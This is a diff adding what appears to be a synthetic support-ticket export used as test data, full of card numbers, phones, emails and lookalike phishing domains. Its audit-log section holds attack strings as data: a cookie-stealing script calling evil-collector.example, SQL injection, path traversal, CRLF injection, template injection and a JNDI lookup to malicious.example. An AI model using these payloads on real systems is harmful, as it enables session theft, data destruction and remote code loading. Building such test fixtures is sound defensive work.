@@ -1,0 +1,50 @@
+SUPPORT TICKET EXPORT - Customer Success Platform
+Generated: 2026-09-08 14:02:11 UTC | Source: api.supportdesk.example/v2/tickets/export
+
+Ticket #10432 | OPEN | High
+From: Brandon N. Bugingo <bnb3854@gmail.com> | ALU: brandon.bugingo@alueducation.com
+Subject: Payment reconciliation issue
+
+Paid via https://portal.alueducation.com/payments?course=SWE202&ref=8823 but it
+failed twice and still charged the card: 4539 1488 0343 6467 (Visa). Retried with
+5500-0050-0000-0004, also pending. Backup card 371449635398431 (Amex) declined.
+
+Call +250 782 949 929 or (078) 234-5566 between 9:00 AM and 5:30 PM CAT.
+Alt lines: 078-100-2233, and supervisor desk 250-788-112233.
+
+Invoice #INV-2291: RWF 450,000 (approx $389.50 USD, see https://xe.com/currencyconverter).
+Late fee $25.00 -> total $414.50. Printing surcharge €12,00. Refund -$9.99 on 2026-08-30.
+
+Internal note (si.alueducation.com queue):
+Escalated to k.mutoni@si.alueducation.com. CC alumni mentor g.uwase@alumni.alueducation.com
+Lookalikes that must NOT validate as ALU mail:
+  fake.student@alueducation.com.phish-site.net
+  admin@alueducation.co
+  test@subdomain.alumni.alueducation.com.evil.org
+  noreply@si.alueducation.com.attacker.io
+
+Follow-up at 14:30 today, 09:15 tomorrow (24h). Agent shift ends 6:45 PM (12h).
+
+Other links: http://support.example.com/kb/article?id=558&lang=en
+  https://www.alueducation.com/admissions/faq/
+  ftp://old-fileserver.internal/backups/ticket10432.zip (legacy, ignore)
+
+Forum tags: #PaymentFailed #ALUStudentLife #TuitionHelp #techsupport2026 #😡notcool
+
+---
+SYSTEM AUDIT LOG (raw, unfiltered feed from upstream API - DO NOT TRUST BLINDLY):
+[2026-09-08T14:01:02Z] note="comment: <script>document.location='http://evil-collector.example/steal?c='+document.cookie</script>"
+[2026-09-08T14:01:05Z] note="query: '); DROP TABLE tickets; --"
+[2026-09-08T14:01:09Z] note="upload attempt: ../../../../etc/passwd"
+[2026-09-08T14:01:14Z] note="header test: X-Fake: 1\r\nSet-Cookie: session=hijacked"
+[2026-09-08T14:01:20Z] note="template test: {{7*7}} and ${jndi:ldap://malicious.example/a}"
+[2026-09-08T14:01:27Z] note="raw card dump: 4111111111111111,4222222222222,not-a-card"
+
+---
+Ticket #10433 | PENDING
+Reporter: J.Doe+billing@Example.CO.UK | Backup: jane_doe1990@yahoo.com
+Invalid entries seen: invalid-email@@double-at.com , plainaddress
+Phone: +1 (415) 555-0199 ext. 42 | Local: 0788112233
+Disputed: KES 2,500 / "2500 RWF" (informal order)
+Card on file (masked, must NOT be treated as real): **** **** **** 4242
+See ticket #10432 for related card issues.
